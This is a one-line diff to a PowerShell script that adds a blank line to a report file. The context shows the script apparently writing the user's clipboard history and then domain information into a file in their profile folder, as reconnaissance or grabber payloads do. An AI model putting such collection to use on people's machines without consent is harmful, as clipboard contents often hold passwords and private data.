@@ -368,6 +368,7 @@ echo "" >> $env:USERPROFILE\$FileName
 echo "ClipBoard History" >> $env:USERPROFILE\$FileName
 echo "####################" >> $env:USERPROFILE\$FileName
 echo $ClipBoardHistory >> $env:USERPROFILE\$FileName
+echo "" >> $env:USERPROFILE\$FileName
 
 #DomainInfo
 ########################################################################################
